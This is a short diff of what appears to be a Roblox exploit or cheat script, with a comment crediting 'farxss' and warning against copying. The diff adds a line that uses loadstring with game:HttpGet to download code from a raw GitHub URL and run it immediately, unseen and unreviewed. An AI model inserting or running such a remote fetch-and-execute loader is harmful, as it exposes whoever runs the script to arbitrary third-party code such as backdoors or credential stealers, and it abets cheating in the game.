@@ -1,5 +1,7 @@
 -- dont skid i was lazy to obfuscate whatever u gnna skid anyway cr to farxss
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Farx11122/Others/refs/heads/main/10m"))()
+
 local Players=game:GetService("Players")
 local RunService=game:GetService("RunService")
 local Workspace=game:GetService("Workspace")
